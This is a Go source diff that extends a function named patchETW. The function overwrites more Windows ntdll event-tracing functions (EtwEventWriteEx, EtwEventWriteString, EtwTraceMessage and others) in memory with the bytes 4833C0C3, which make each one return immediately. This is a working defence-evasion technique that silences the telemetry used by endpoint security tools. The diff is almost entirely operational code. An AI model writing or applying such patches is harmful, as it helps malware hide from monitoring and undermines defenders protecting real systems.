@@ -17,6 +17,12 @@ var procEtwEventRegister = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventRegi
 var procEtwEventWriteFull = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteFull")
 var procEtwEventWrite = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWrite")
 
+var procEtwEventWriteEx = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteEx")
+var procEtwEventWriteNoRegistration = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteNoRegistration")
+var procEtwEventWriteString = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteString")
+var procEtwEventWriteTransfer = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwEventWriteTransfer")
+var procEtwTraceMessage = syscall.NewLazyDLL("ntdll.dll").NewProc("EtwTraceMessage")
+
 func errnoErr(e syscall.Errno) error {
 	switch e {
 	case 0:
@@ -42,7 +48,17 @@ func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte,
 
 func patchETW() {
 	handle := uintptr(0xffffffffffffffff)
-	dataAddr := []uintptr{ procEtwNotificationRegister.Addr(), procEtwEventRegister.Addr(), procEtwEventWriteFull.Addr(), procEtwEventWrite.Addr()}
+	dataAddr := []uintptr{ 
+		procEtwNotificationRegister.Addr(), 
+		procEtwEventRegister.Addr(), 
+		procEtwEventWriteFull.Addr(), 
+		procEtwEventWrite.Addr(),
+		procEtwEventWriteEx.Addr(),
+		procEtwEventWriteNoRegistration.Addr(),
+		procEtwEventWriteString.Addr(),
+		procEtwEventWriteTransfer.Addr(),
+		procEtwTraceMessage.Addr(),
+	}
 	for i, _ := range dataAddr {
 		data, _ := hex.DecodeString("4833C0C3")
 		var nLength uintptr
